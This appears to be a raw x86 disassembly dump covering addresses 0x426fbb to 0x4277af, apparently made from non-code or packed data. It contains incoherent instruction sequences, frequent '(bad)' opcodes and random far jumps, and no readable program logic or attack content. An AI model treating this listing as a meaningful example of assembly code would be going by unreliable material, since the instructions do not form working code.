  426fbb:	pop    ss
  426fbc:	dec    ecx
  426fbd:	mov    ebp,0x6fff649a
  426fc2:	icebp  
  426fc3:	or     eax,0x7bd2a030
  426fc8:	test   DWORD PTR [edx+0x30],esp
  426fcb:	icebp  
  426fcc:	int3   
  426fcd:	or     BYTE PTR [ecx-0x6],bl
  426fd0:	fstp   QWORD PTR [ebx+0x26cc6cb1]
  426fd6:	sbb    ch,BYTE PTR [edx-0x26fd3093]
  426fdc:	cwde   
  426fdd:	in     eax,0x97
  426fdf:	retf   
  426fe0:	mov    BYTE PTR [eax],cl
  426fe2:	dec    eax
  426fe3:	mov    dl,BYTE PTR [ebp+eax*2+0x13]
  426fe7:	push   es
  426fe8:	jle    0x426f85
  426fea:	loopne 0x427004
  426fec:	clc    
  426fed:	xchg   ebp,eax
  426fee:	test   eax,0x2b4a04a1
  426ff3:	test   eax,0x206e6223
  426ff8:	pop    ebx
  426ff9:	mov    al,ds:0xff5fe11d
  426ffe:	(bad)  
  426fff:	vmread DWORD PTR [edx+0x4d],esi
  427003:	fcmove st,st(1)
  427005:	pop    esi
  427006:	pop    es
  427007:	ja     0x426fc4
  427009:	fwait
  42700a:	sbb    dl,0xd5
  42700d:	mov    ds:0x8e6134f6,eax
  427012:	cmp    edi,DWORD PTR [edx+0x786219fc]
  427018:	sub    eax,DWORD PTR [ecx+0x7930f8ba]
  42701e:	inc    eax
  42701f:	push   esi
  427020:	sub    DWORD PTR [ebp+0x77],ecx
  427023:	sar    BYTE PTR [edx+0x6fef9b2d],cl
  427029:	push   ss
  42702a:	adc    edx,edx
  42702c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42702d:	mov    ah,0x2f
  42702f:	(bad)  
  427030:	loope  0x42706f
  427032:	or     edi,esp
  427034:	adc    BYTE PTR [edx],bl
  427036:	mov    bh,ch
  427038:	mov    eax,0x4dbfc55c
  42703d:	clc    
  42703e:	cmp    edx,edx
  427040:	nop
  427041:	popf   
  427042:	cs push ebp
  427044:	scas   al,BYTE PTR es:[edi]
  427045:	xor    ebx,ecx
  427047:	xchg   esp,eax
  427048:	addr16 jmp 0x8c60:0x36cf
  42704f:	leave  
  427050:	(bad)  [ebx]
  427052:	test   eax,0x15d3ca75
  427057:	mov    ebx,ebp
  427059:	das    
  42705a:	(bad)  
  42705b:	mov    ecx,0xbbb08942
  427060:	mov    BYTE PTR [edx],al
  427062:	xchg   edx,eax
  427063:	ror    al,cl
  427065:	leave  
  427066:	stos   BYTE PTR es:[edi],al
  427067:	jnp    0x4270e2
  427069:	adc    al,0xa7
  42706b:	retf   0x6359
  42706e:	add    BYTE PTR [edi+0x6b],bl
  427071:	inc    ebx
  427072:	xchg   ebp,eax
  427073:	mov    dl,0x95
  427075:	ins    DWORD PTR es:[edi],dx
  427076:	add    al,0x14
  427078:	fsub   QWORD PTR [ebx]
  42707a:	adc    ebx,ebp
  42707c:	jl     0x427018
  42707e:	cdq    
  42707f:	clc    
  427080:	imul   ebp,DWORD PTR [eax-0x4bc11ccc],0xffffffeb
  427087:	sti    
  427088:	ror    BYTE PTR [edi-0x43535747],cl
  42708e:	vpackuswb ymm0,ymm2,ymm4
  427092:	nop
  427093:	js     0x4270d7
  427095:	retf   0x2b60
  427098:	mov    dh,0x5a
  42709a:	mov    cl,0xf
  42709c:	rcr    edx,0xd
  42709f:	jmp    0x42709e
  4270a1:	(bad)  
  4270a2:	call   DWORD PTR [ebx-0xc70c35a]
  4270a8:	popf   
  4270a9:	jbe    0x4270a8
  4270ab:	call   0x8fca58fc
  4270b0:	push   edx
  4270b1:	addr16 pop ss
  4270b3:	jno    0x427068
  4270b5:	jae    0x427106
  4270b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4270b8:	dec    ecx
  4270b9:	dec    esi
  4270ba:	sbb    al,0x53
  4270bc:	ins    DWORD PTR es:[edi],dx
  4270bd:	je     0x4270fb
  4270bf:	mov    eax,0x5ab328df
  4270c4:	mov    esp,0x4f4874d6
  4270c9:	or     ebx,DWORD PTR [ebx]
  4270cb:	sub    esp,DWORD PTR [esi-0x31bc413a]
  4270d1:	out    0x4e,eax
  4270d3:	sbb    ebx,DWORD PTR [ecx+0x4b]
  4270d6:	shr    BYTE PTR [edx],0x7
  4270d9:	push   ss
  4270da:	mov    dl,0xc4
  4270dc:	push   cs
  4270dd:	sub    ecx,DWORD PTR [eax]
  4270df:	and    bh,ch
  4270e1:	fadd   DWORD PTR [edx+0x27168467]
  4270e7:	fld    QWORD PTR [eax+0x9]
  4270ea:	js     0x427071
  4270ec:	and    al,0x9a
  4270ee:	cmp    al,0xf0
  4270f0:	xchg   ebp,eax
  4270f1:	inc    esp
  4270f2:	mov    WORD PTR gs:[ecx],?
  4270f5:	shr    BYTE PTR [esi+0x34],cl
  4270f8:	push   cs
  4270f9:	pusha  
  4270fa:	inc    ecx
  4270fb:	jl     0x427122
  4270fd:	test   BYTE PTR [esi],0x18
  427100:	or     edx,DWORD PTR [eax+0x294f94a9]
  427106:	std    
  427107:	pushf  
  427108:	mov    edx,0x1d5c00ef
  42710d:	or     BYTE PTR [edx-0x3ad7745c],cl
  427113:	lds    esp,FWORD PTR [edi+0x72d83781]
  427119:	out    dx,al
  42711a:	add    DWORD PTR [ecx+0x45],0xffffffc9
  42711e:	inc    ebp
  42711f:	(bad)  
  427120:	lock jmp eax
  427123:	xchg   ebx,eax
  427124:	imul   BYTE PTR [eax]
  427126:	push   edi
  427127:	xchg   edi,edx
  427129:	push   eax
  42712a:	lods   eax,DWORD PTR ds:[esi]
  42712b:	aad    0x4e
  42712d:	stc    
  42712e:	xchg   ebx,eax
  42712f:	popf   
  427130:	adc    edx,DWORD PTR [edi]
  427132:	enter  0x1000,0x6f
  427136:	and    eax,0x4e560689
  42713b:	xchg   ecx,eax
  42713c:	popf   
  42713d:	jmp    0x42716b
  42713f:	adc    DWORD PTR [edx+0x3a],ebp
  427142:	cwde   
  427143:	or     DWORD PTR [edx+0x2e],0x19
  427147:	or     al,0x73
  427149:	cmp    eax,DWORD PTR [ecx-0x2d]
  42714c:	loopne 0x4271a1
  42714e:	jmp    0xe1066fd1
  427153:	(bad)  
  427155:	cmp    bl,BYTE PTR [ecx-0x6d2b687b]
  42715b:	aam    0xa7
  42715d:	imul   edi,DWORD PTR [edx-0x2b],0x9
  427161:	pusha  
  427162:	mov    esi,0xa8c9d467
  427167:	fcom   DWORD PTR [esi]
  427169:	fsub   st,st(1)
  42716b:	or     eax,0xdf4fbe7b
  427170:	jo     0x4271a8
  427172:	sahf   
  427173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427174:	retf   0x4900
  427177:	fcomip st,st(2)
  427179:	jmp    0xbbb5:0x823931
  427180:	dec    esp
  427181:	js     0x4271c5
  427183:	rcr    dl,0x29
  427186:	cwde   
  427187:	push   DWORD PTR ds:0xc3942142
  42718d:	push   edx
  42718e:	add    BYTE PTR [edi+0x10626a4d],0x68
  427195:	sbb    bh,BYTE PTR [edx-0x56]
  427198:	mov    es,WORD PTR [esi-0x21]
  42719b:	add    eax,0xca39e467
  4271a0:	or     DWORD PTR [eax-0x5bc1b3a1],edi
  4271a6:	cmp    al,0x9b
  4271a8:	jns    0x427132
  4271aa:	xor    edx,DWORD PTR [esp+ecx*1]
  4271ad:	ds jg  0x427149
  4271b0:	(bad)  
  4271b1:	ins    DWORD PTR es:[edi],dx
  4271b2:	ins    BYTE PTR es:[edi],dx
  4271b3:	adc    BYTE PTR [ebx+edx*2-0x3f],dh
  4271b7:	and    cl,BYTE PTR [edi]
  4271b9:	xchg   ebx,eax
  4271ba:	sbb    eax,0xd8a7638
  4271bf:	xchg   edi,eax
  4271c0:	fist   WORD PTR [ebx+0x1c3cf6fb]
  4271c6:	xchg   edx,eax
  4271c7:	(bad)  
  4271c8:	mov    dh,BYTE PTR [edi]
  4271ca:	call   0xec6:0x4c93bb56
  4271d1:	out    0x8e,al
  4271d3:	aad    0x9d
  4271d5:	(bad)  
  4271d6:	jb     0x427190
  4271d8:	les    esi,FWORD PTR [ecx+0x1e]
  4271db:	out    dx,al
  4271dc:	mov    dl,0xbf
  4271de:	stos   BYTE PTR es:[edi],al
  4271df:	sub    dl,ch
  4271e1:	test   eax,0x62e59ea
  4271e6:	jecxz  0x4271db
  4271e8:	dec    eax
  4271e9:	lods   al,BYTE PTR ds:[si]
  4271eb:	fisubr WORD PTR [edi-0x586ad3bd]
  4271f1:	repz retf 0x258b
  4271f5:	sub    al,0x1
  4271f7:	jae    0x427230
  4271f9:	jecxz  0x4271e4
  4271fb:	test   BYTE PTR [ebp+0x4],bh
  4271fe:	(bad)  
  4271ff:	lock or eax,0x4907500e
  427205:	sti    
  427206:	and    BYTE PTR [edx+0x452aa87],0x4e
  42720d:	xchg   esp,eax
  42720e:	outs   dx,BYTE PTR ds:[esi]
  42720f:	in     eax,dx
  427210:	iret   
  427211:	add    esi,DWORD PTR ds:0xaea8a7e3
  427217:	mov    esi,0x13ea5410
  42721c:	fdiv   DWORD PTR [edx-0x38ddb8d3]
  427222:	int3   
  427223:	icebp  
  427224:	in     eax,0x7a
  427226:	into   
  427227:	xor    ch,BYTE PTR [eax-0x5dc840a4]
  42722d:	in     al,dx
  42722e:	(bad)  
  42722f:	shl    BYTE PTR [bx+di],0x22
  427233:	ret    0x55de
  427236:	push   eax
  427237:	mov    ds:0xc185cf,al
  42723c:	fcom   DWORD PTR [edx]
  42723e:	cmp    ebx,ebp
  427240:	xchg   ebx,eax
  427241:	add    ch,cl
  427243:	mov    cl,0x18
  427245:	sub    DWORD PTR [ecx-0x4ff700d1],esi
  42724b:	mov    ecx,0xf43dcff1
  427250:	cmc    
  427251:	sbb    BYTE PTR [edi-0x56],ch
  427254:	add    bl,BYTE PTR [edi]
  427256:	push   es
  427257:	cwde   
  427258:	ret    
  427259:	push   cs
  42725a:	mov    DWORD PTR [eax-0x16d937c],eax
  427260:	pop    esp
  427261:	and    DWORD PTR [edi+0x2b],esi
  427264:	call   0x714e:0x17a11597
  42726b:	out    dx,al
  42726c:	fidivr DWORD PTR [esi+0x72b35bcf]
  427272:	dec    edx
  427273:	cs mov edi,0x96cd979a
  427279:	xchg   DWORD PTR [ebx-0x2],ecx
  42727c:	ins    BYTE PTR es:[edi],dx
  42727d:	mov    ecx,0x553051ba
  427282:	jmp    DWORD PTR [edx+edx*8]
  427285:	mov    ah,0x70
  427287:	add    eax,0xf1dc6786
  42728c:	lds    edi,FWORD PTR ds:0x6e4055f
  427292:	sbb    BYTE PTR [ebx+0x5b],0x0
	...
  4272aa:	inc    edi
  4272ab:	push   esi
  4272ac:	dec    esp
  4272ad:	inc    edx
  4272ae:	pop    ebp
  4272af:	pop    edx
  4272b0:	dec    edi
  4272b1:	push   edi
  4272b2:	dec    edx
  4272b3:	push   es
  4272b4:	enter  0x4d81,0x64
  4272b8:	add    eax,0x1fef98e
  4272bd:	add    dh,cl
  4272bf:	push   es
  4272c0:	add    BYTE PTR [eax],al
  4272c2:	stc    
  4272c3:	add    al,0x9b
  4272c5:	imul   esi,DWORD PTR [edx+eiz*4],0x66
  4272c9:	mov    esi,0x2d396ca
  4272ce:	icebp  
  4272cf:	xor    bh,BYTE PTR [esi-0x27]
  4272d2:	shr    ch,1
  4272d4:	cmp    bl,BYTE PTR [ebx-0x32]
  4272d7:	fadd   st,st(4)
  4272d9:	xchg   ebx,eax
  4272da:	repz pushf 
  4272dc:	mov    cl,0xdb
  4272de:	imul   eax,DWORD PTR [ebx-0x2b0d16ca],0x3c3f5b7a
  4272e8:	and    edx,DWORD PTR [edx-0x76]
  4272eb:	adc    ebp,ebx
  4272ed:	pop    ds
  4272ee:	stos   DWORD PTR es:[edi],eax
  4272ef:	jmp    0x8bc4ba72
  4272f4:	or     ebx,DWORD PTR [edx-0x35]
  4272f7:	xchg   BYTE PTR [edx+0x1a],dl
  4272fa:	stos   DWORD PTR es:[edi],eax
  4272fb:	and    al,0xe3
  4272fd:	fucom  st(1)
  4272ff:	push   es
  427300:	jmp    0x6c054926
  427305:	pop    esi
  427306:	push   0xffffffe1
  427308:	sbb    edi,DWORD PTR [ecx-0x8]
  42730b:	cmp    dh,ch
  42730d:	adc    dh,BYTE PTR [esi+0x35f83b22]
  427313:	xor    bl,BYTE PTR [eax-0x6cea80fd]
  427319:	jno    0x4272a8
  42731b:	pop    ecx
  42731c:	div    DWORD PTR [ebx+0x1dcbcd2a]
  427322:	xchg   ecx,eax
  427323:	pop    edi
  427325:	push   ds
  427326:	cdq    
  427327:	add    cl,bh
  427329:	mov    WORD PTR [ebp-0x50085ed5],gs
  42732f:	push   bx
  427331:	idiv   edx
  427333:	xchg   edi,eax
  427334:	test   BYTE PTR [ecx],ch
  427336:	add    eax,0xdb6390bd
  42733b:	mov    gs,ebx
  42733d:	repnz add ebx,DWORD PTR [ebp+0x22]
  427341:	jecxz  0x427389
  427343:	scas   eax,DWORD PTR es:[edi]
  427344:	pop    edi
  427345:	cmp    DWORD PTR [esi+edi*4-0x414cee7a],ebp
  42734c:	ins    DWORD PTR es:[edi],dx
  42734d:	jo     0x4272de
  42734f:	and    DWORD PTR [eax+0x73a801da],0xffffffb2
  427356:	popa   
  427357:	outs   dx,BYTE PTR ds:[esi]
  427358:	loopne 0x427383
  42735a:	adc    ebx,DWORD PTR [edx]
  42735c:	push   cs
  42735d:	iret   
  42735e:	mov    cl,0x93
  427360:	test   eax,0xc551ad78
  427365:	jp     0x4273a1
  427367:	xor    eax,0x199acf65
  42736c:	jno    0x427372
  42736e:	mov    bl,0xa2
  427371:	(bad)  
  427372:	push   esp
  427373:	jle    0x42733b
  427375:	(bad)  
  427376:	(bad)  
  427377:	mov    dh,BYTE PTR [ebx+0x633307fd]
  42737d:	pop    esp
  42737e:	sub    ch,dl
  427380:	xchg   ebp,eax
  427381:	xchg   ebx,eax
  427382:	gs in  al,0x5b
  427385:	xchg   al,dh
  427387:	les    esp,FWORD PTR [eax+0x66c993ce]
  42738d:	in     eax,0xc1
  42738f:	das    
  427390:	jecxz  0x42740a
  427392:	mov    ecx,0x63e5a21
  427397:	loope  0x42732e
  427399:	lahf   
  42739a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42739b:	adc    eax,0x26d4d0f5
  4273a0:	popf   
  4273a1:	ret    0x617
  4273a4:	shl    DWORD PTR [edx],1
  4273a6:	shl    DWORD PTR [edi+0x5b271286],0xc0
  4273ad:	adc    al,0xd5
  4273af:	pusha  
  4273b0:	ins    BYTE PTR es:[edi],dx
  4273b1:	jmp    0x4273b4
  4273b3:	sub    eax,0x879be0f7
  4273b8:	xchg   BYTE PTR [edi+0x68],ah
  4273bb:	cs jecxz 0x4273a1
  4273be:	jne    0x4273bd
  4273c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273c1:	inc    edi
  4273c2:	arpl   WORD PTR es:[edi-0x37dfc461],ax
  4273c9:	pop    es
  4273ca:	int3   
  4273cb:	sbb    esp,DWORD PTR [esi]
  4273cd:	sbb    BYTE PTR ds:0x78cb628b,dh
  4273d3:	add    ecx,edi
  4273d5:	popf   
  4273d6:	es dec ebp
  4273d8:	rcl    cl,cl
  4273da:	mov    ebp,cs
  4273dc:	stc    
  4273dd:	lahf   
  4273de:	mov    edi,0xc4f9e4d3
  4273e3:	sub    al,0x54
  4273e5:	dec    esi
  4273e6:	mov    eax,ds:0xf4aa5d68
  4273eb:	das    
  4273ec:	xchg   edx,eax
  4273ed:	call   DWORD PTR [edi-0x4c77cab0]
  4273f3:	loop   0x4273ed
  4273f5:	xchg   esi,eax
  4273f6:	rol    DWORD PTR ds:0xde66d98c,0xe6
  4273fd:	addr16 push ebx
  4273ff:	aad    0x7c
  427401:	inc    edx
  427402:	shl    BYTE PTR [edi],0xd
  427405:	fadd   st(7),st
  427407:	pcmpgtd mm5,mm5
  42740a:	js     0x4273d7
  42740c:	clc    
  42740d:	pop    ebp
  42740e:	sub    DWORD PTR [ecx+ebx*1+0x3d],0x9b35473e
  427416:	je     0x42748a
  427418:	scas   al,BYTE PTR es:[edi]
  427419:	pop    ss
  42741a:	lods   al,BYTE PTR ds:[esi]
  42741b:	stc    
  42741c:	cli    
  42741d:	push   edx
  42741e:	jl     0x427480
  427420:	clc    
  427421:	fdivr  QWORD PTR [ebp+0x5b]
  427424:	xchg   ebx,eax
  427425:	(bad)  
  427426:	jle    0x42742a
  427428:	sbb    eax,0x4efc63c4
  42742d:	ror    BYTE PTR [ebx],0xb8
  427430:	cmp    edi,DWORD PTR [edx+0x40]
  427433:	pop    esi
  427434:	rcr    BYTE PTR [ebx],cl
  427436:	aad    0x66
  427438:	push   0xfffffff2
  42743a:	call   0xad66:0xfd77f523
  427441:	dec    ecx
  427442:	xor    al,0xbd
  427444:	imul   ebp,esi,0xfffffffb
  427447:	aad    0xfa
  427449:	cmp    al,0x54
  42744b:	ud0    edi,DWORD PTR [eax]
  42744e:	and    al,0x24
  427450:	lds    edi,FWORD PTR [edi+eiz*2-0x3b]
  427454:	ret    
  427455:	nop
  427456:	outs   dx,BYTE PTR ds:[esi]
  427457:	dec    ebp
  427458:	jne    0x4274a5
  42745a:	dec    esp
  42745b:	out    dx,al
  42745c:	lea    ebx,[eax]
  42745e:	ret    0x46ae
  427461:	xor    BYTE PTR [esi+eiz*2],al
  427464:	popf   
  427465:	mov    ds:0x106de3f9,eax
  42746a:	xor    edx,edi
  42746c:	add    BYTE PTR [eax],bh
  42746e:	mov    ecx,0x211337d3
  427473:	lds    ecx,FWORD PTR [ecx+0x56ea90f9]
  427479:	adc    al,0x7c
  42747b:	dec    esi
  42747c:	ss sub eax,0xc2ec32ad
  427482:	out    0x2b,eax
  427484:	sbb    edi,DWORD PTR [eax+ebp*8-0x3ae45496]
  42748b:	mov    eax,ds:0xd4bf2f7e
  427490:	mov    eax,DWORD PTR [esi+esi*4]
  427493:	dec    ebp
  427494:	into   
  427495:	fnstcw WORD PTR [edx-0x49248847]
  42749b:	retf   0x5883
  42749e:	outs   dx,BYTE PTR ds:[esi]
  42749f:	xor    BYTE PTR [eax],al
  4274a1:	xor    al,cl
  4274a3:	lods   al,BYTE PTR ds:[esi]
  4274a4:	leave  
  4274a5:	sbb    ebx,esi
  4274a7:	(bad)  
  4274a9:	(bad)
  4274ac:	dec    ecx
  4274ad:	xor    eax,0xd20d6a34
  4274b2:	xchg   esi,eax
  4274b3:	pop    esp
  4274b4:	pop    esp
  4274b5:	add    BYTE PTR [ebx+edx*2],cl
  4274b8:	(bad)  
  4274b9:	sahf   
  4274ba:	or     DWORD PTR [edx+0x3b],esp
  4274bd:	jne    0x42749f
  4274bf:	pop    esp
  4274c0:	jecxz  0x42747c
  4274c2:	je     0x4274da
  4274c4:	fadd   DWORD PTR [ebx+0x72]
  4274c7:	pop    edx
  4274c8:	adc    eax,0x7d63bf6d
  4274cd:	stos   BYTE PTR es:[edi],al
  4274ce:	pop    eax
  4274cf:	test   eax,0x91da025c
  4274d4:	mov    ecx,0xfd5ea73c
  4274d9:	stc    
  4274da:	(bad)  
  4274dc:	jp     0x4274d9
  4274de:	mov    ch,0x79
  4274e0:	popf   
  4274e1:	(bad)  
  4274e3:	fdiv   DWORD PTR [ebx+0x1e]
  4274e6:	xor    BYTE PTR [eax-0x5f],0x7a
  4274ea:	(bad)  
  4274ec:	clc    
  4274ed:	loopne 0x4274a2
  4274ef:	test   al,0x54
  4274f1:	jge    0x42748a
  4274f3:	pop    esp
  4274f4:	inc    esp
  4274f5:	shl    BYTE PTR [edi+eiz*8-0x39f55260],cl
  4274fc:	rcr    DWORD PTR [esi-0x4651c9dc],1
  427502:	inc    edi
  427503:	aaa    
  427504:	fs xchg ecx,eax
  427506:	mov    esp,0xf69f34ec
  42750b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42750c:	ins    BYTE PTR es:[edi],dx
  42750d:	in     eax,0xe6
  42750f:	shl    DWORD PTR [edi+0x4e680288],0x9f
  427516:	fisubr DWORD PTR [esi-0x75e8ed12]
  42751c:	lahf   
  42751d:	ds pop eax
  42751f:	dec    edx
  427520:	into   
  427521:	outs   dx,BYTE PTR ds:[esi]
  427522:	mov    esi,0x414fbfcb
  427527:	retf   0x4d3
  42752a:	sbb    ch,BYTE PTR [edx+0x2c]
  42752d:	jae    0x42751f
  42752f:	test   DWORD PTR [edx],esi
  427531:	jo     0x4274ee
  427533:	aaa    
  427534:	mov    esi,0x67c0a2cc
  427539:	jbe    0x4274fe
  42753b:	sub    DWORD PTR [ebx],ebp
  42753d:	inc    eax
  42753e:	cmp    al,0xbe
  427540:	out    0x14,al
  427542:	pop    esi
  427543:	mov    edi,0x4f1781f8
  427549:	in     al,dx
  42754a:	push   ds
  42754b:	push   edi
  42754c:	out    0x28,al
  42754e:	jmp    0xab1946df
  427553:	mov    ah,0xf6
  427555:	shl    BYTE PTR [ebp+0x4f2975bf],cl
  42755b:	jbe    0x4274e8
  42755d:	add    DWORD PTR [ebx-0x30560395],ecx
  427563:	jae    0x427581
  427565:	aad    0xd6
  427567:	in     eax,dx
  427568:	sbb    DWORD PTR [edx],eax
  42756a:	pusha  
  42756b:	dec    eax
  42756c:	cld    
  42756d:	sbb    DWORD PTR [ebx-0x77],eax
  427570:	mov    cl,BYTE PTR [eax]
  427572:	xchg   esi,eax
  427573:	sub    cl,0x6c
  427576:	jne    0x4275d9
  427578:	mov    WORD PTR [ebp+0x5e],ds
  42757b:	xor    al,0x28
  42757d:	jmp    0x1027354c
  427582:	pop    ss
  427583:	into   
  427584:	outs   dx,BYTE PTR ds:[esi]
  427585:	test   eax,0xfbfa6e6
  42758a:	add    DWORD PTR [edx+0x2731ab63],esi
  427590:	pop    ss
  427591:	arpl   bp,sp
  427593:	sbb    ch,BYTE PTR [esi-0x7d]
  427596:	sub    ebp,DWORD PTR [eax]
  427598:	sub    al,0x37
  42759a:	test   BYTE PTR [ebx],0xdd
  42759d:	hlt    
  42759e:	rcr    DWORD PTR [ecx],1
  4275a0:	rol    ah,1
  4275a2:	pop    edx
  4275a3:	(bad)  
  4275a4:	shl    DWORD PTR [ebx-0x6e],cl
  4275a7:	sbb    bh,dl
  4275a9:	in     al,0x56
  4275ab:	or     DWORD PTR [edi],ebx
  4275ad:	outs   dx,BYTE PTR ds:[esi]
  4275ae:	xchg   ebx,eax
  4275af:	sub    al,0x40
  4275b1:	dec    esi
  4275b2:	add    BYTE PTR [esp+ecx*8+0x31],0xf2
  4275b7:	out    dx,al
  4275b8:	xchg   esi,eax
  4275b9:	ror    esp,cl
  4275bb:	stos   DWORD PTR es:[edi],eax
  4275bc:	pop    edi
  4275bd:	aam    0x41
  4275bf:	data16 in al,0x40
  4275c2:	jo     0x4275c0
  4275c4:	sub    ecx,DWORD PTR [ecx-0x43017fc3]
  4275ca:	test   DWORD PTR [esp+ecx*8+0x61],eax
  4275ce:	and    eax,0x344b4ed7
  4275d3:	and    edx,edx
  4275d5:	shr    BYTE PTR [edx-0x11a3538d],cl
  4275db:	pop    ss
  4275dc:	sar    DWORD PTR [edi-0x66],cl
  4275df:	pop    ss
  4275e0:	scas   al,BYTE PTR es:[edi]
  4275e1:	daa    
  4275e2:	push   es
  4275e3:	inc    edx
  4275e4:	mov    esi,0xe1a4c64f
  4275e9:	xchg   DWORD PTR [ebx-0x6b],ecx
  4275ec:	jo     0x427587
  4275ee:	loopne 0x427669
  4275f0:	daa    
  4275f1:	mov    DWORD PTR [ebp+eax*8+0x2af5a],ecx
  4275f8:	mov    ch,BYTE PTR fs:[esi+edx*8-0x62]
  4275fd:	in     al,dx
  4275fe:	or     eax,0x3bc5bb46
  427603:	(bad)  
  427604:	icebp  
  427605:	mov    ds:0x759cf6f7,al
  42760a:	add    dh,ch
  42760c:	dec    edi
  42760d:	mov    esp,cs
  42760f:	add    al,0xa7
  427611:	lock rol BYTE PTR [ebx+ebx*1],0xf
  427616:	fbld   TBYTE PTR [edx+0x5cf95c71]
  42761c:	sbb    DWORD PTR [ecx-0x48],edx
  42761f:	aad    0xd3
  427621:	pop    ebx
  427622:	fst    DWORD PTR [edi+0x1af620af]
  427628:	adc    al,0xb4
  42762a:	(bad)  
  42762b:	jnp    0x42761a
  42762d:	mov    al,dl
  42762f:	adc    BYTE PTR [edx-0x767439be],0x74
  427636:	adc    esp,esi
  427638:	test   ecx,eax
  42763a:	fs pop edx
  42763c:	add    al,0x3d
  42763e:	mov    eax,0x97ad95ca
  427643:	xlat   BYTE PTR ds:[ebx]
  427644:	sbb    DWORD PTR [ebx-0x10],ecx
  427647:	sbb    DWORD PTR [ecx],eax
  427649:	hlt    
  42764a:	jmp    0x312b:0x11ac4edc
  427651:	nop    ebp
  427654:	mov    edi,0x63a207b8
  427659:	and    BYTE PTR [ecx],dh
  42765b:	idiv   BYTE PTR [esi-0x70]
  42765e:	pop    ecx
  42765f:	sub    eax,0xd1fda132
  427664:	clc    
  427665:	mov    DWORD PTR [esi],ecx
  427667:	mov    ebp,0x707838f6
  42766c:	adc    eax,0x5348bc8a
  427671:	test   eax,0xa67f81a4
  427676:	xor    bh,bl
  427678:	into   
  427679:	ja     0x4276c2
  42767b:	push   es
  42767c:	jl     0x42769c
  42767e:	test   eax,0xf62854e8
  427683:	xchg   ecx,eax
  427684:	and    BYTE PTR [edi-0x66],ch
  427687:	das    
  427688:	push   ss
  427689:	adc    eax,0x4d75caa7
  42768e:	cmp    BYTE PTR [esi],ah
  427690:	mov    cl,0x9a
  427692:	jmp    0xa36c:0x1b0ab4ea
  427699:	inc    ebx
  42769a:	(bad)  
  42769b:	sbb    BYTE PTR [edx],bh
  42769d:	out    dx,eax
  42769e:	out    0xdb,al
  4276a0:	aas    
  4276a1:	imul   edi,DWORD PTR ds:0x5b5c75e6,0x65
  4276a8:	xchg   edi,eax
  4276a9:	imul   ecx,edi,0xffffffe4
  4276ac:	pop    edx
  4276ad:	jmp    0x4a3b:0x8f29010e
  4276b4:	aaa    
  4276b5:	stos   DWORD PTR es:[edi],eax
  4276b6:	pop    ebx
  4276b7:	push   ss
  4276b8:	push   cs
  4276b9:	fwait
  4276ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276bb:	or     ah,BYTE PTR [ecx-0x48]
  4276be:	retf   0xbfec
  4276c1:	cmp    al,BYTE PTR [esp+edx*4+0x5cd939ad]
  4276c8:	xlat   BYTE PTR ds:[ebx]
  4276c9:	mov    ah,0xa6
  4276cb:	mov    al,ds:0xaa6c3e2a
  4276d0:	mov    edi,0x2e894f96
  4276d5:	mov    BYTE PTR [esi+0x75],0x35
  4276d9:	(bad)  
  4276da:	fnstcw WORD PTR [edi+0x219dd23]
  4276e0:	imul   ebx,ecx,0xffffffb3
  4276e3:	call   0xdf5f:0xf821eacf
  4276ea:	loope  0x42775a
  4276ec:	js     0x4276b7
  4276ee:	sbb    ah,BYTE PTR [edi-0x20dac7bb]
  4276f4:	xor    esp,esi
  4276f6:	mov    edx,0x9a6d5607
  4276fb:	mov    esp,DWORD PTR [eax-0x77]
  4276fe:	mov    WORD PTR [ecx],es
  427700:	jo     0x4276be
  427702:	pop    edi
  427703:	pop    ebx
  427704:	inc    ebp
  427705:	cli    
  427706:	or     eax,0xd8fd60bc
  42770b:	inc    ebx
  42770c:	xchg   edx,eax
  42770d:	mov    esp,DWORD PTR [esp+esi*8-0x2]
  427711:	fiadd  DWORD PTR [ebx+0x5a]
  427714:	jge    0x4276e3
  427716:	jg     0x427756
  427718:	cs imul ecx,edx,0x73
  42771c:	sub    bl,BYTE PTR [ecx-0x3ada372c]
  427722:	or     DWORD PTR [eax],esi
  427724:	mov    ds,WORD PTR [ebx-0x72]
  427727:	or     bl,ch
  427729:	test   al,0xa5
  42772b:	jo     0x42772f
  42772d:	add    BYTE PTR [ecx+0x6b],ch
  427730:	dec    ebx
  427731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427732:	mov    ebx,0xef6bcf71
  427737:	inc    edx
  427738:	daa    
  427739:	sbb    BYTE PTR [ebx],dh
  42773b:	push   ss
  42773c:	xlat   BYTE PTR ds:[ebx]
  42773d:	lock rcl BYTE PTR [esi+0x16c18f3d],1
  427744:	adc    bl,BYTE PTR [ebx+0x69]
  427747:	(bad)  [edx+0x178fa85]
  42774d:	add    BYTE PTR [edi-0x16d4d5b],ah
  427753:	leave  
  427754:	ror    BYTE PTR [edi+0x1b2776aa],1
  42775a:	pop    edi
  42775b:	adc    ch,al
  42775d:	pusha  
  42775e:	pop    edi
  42775f:	add    al,0xe7
  427761:	mov    esi,edx
  427763:	pusha  
  427764:	out    dx,al
  427765:	in     al,dx
  427766:	jne    0x42773c
  427768:	cmp    al,0x90
  42776a:	sbb    eax,DWORD PTR [edx]
  42776c:	jnp    0x427752
  42776e:	mov    ebp,0xd6772794
  427773:	popf   
  427774:	push   0x11ddc8ca
  427779:	les    ecx,FWORD PTR [eax-0x10b6b2cc]
  42777f:	jg     0x4277d5
  427781:	sub    al,0xc9
  427783:	popf   
  427784:	scas   eax,DWORD PTR es:[edi]
  427785:	ret    
  427786:	stos   BYTE PTR es:[edi],al
  427787:	push   ebx
  427788:	jl     0x4277e3
  42778a:	pop    eax
  42778b:	sub    ecx,eax
  42778d:	vrsqrtss xmm3,xmm5,DWORD PTR [ebp+0xf]
  427792:	mov    ds:0x76b71feb,eax
  427797:	lea    ebx,[eax+0x641ba02a]
  42779d:	mov    ebx,DWORD PTR ds:[eax-0x38318c9]
  4277a4:	bound  ebx,QWORD PTR [ebp+0x57]
  4277a7:	sub    BYTE PTR [ebx+ebp*1+0x75],bl
  4277ab:	cmc    
  4277ac:	out    dx,eax
  4277ad:	dec    ebp
  4277ae:	(bad)  
  4277af:	dec    esi
